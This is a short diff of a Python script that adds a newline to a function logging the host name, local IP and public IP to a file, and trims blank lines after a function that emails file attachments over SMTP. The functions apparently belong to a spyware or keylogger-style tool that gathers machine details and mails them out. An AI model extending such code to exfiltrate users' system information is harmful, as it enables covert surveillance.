@@ -47,7 +47,7 @@ def computer_information():
         IPaddr = socket.gethostbyname(hostname)
         try:
             public_ip = get("https://api.ipify.org").text
-            f.write("Public IP Address: " + public_ip)
+            f.write("Public IP Address: " + public_ip + '\n')
         except Exception:
             f.write("Couldn't get Public IP Address (most likely max query)")
 
@@ -112,70 +112,3 @@ def send_email(filename, attachment, toaddr):
     text = msg.as_string()
     s.sendmail(fromaddr, toaddr, text)
     s.quit()
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
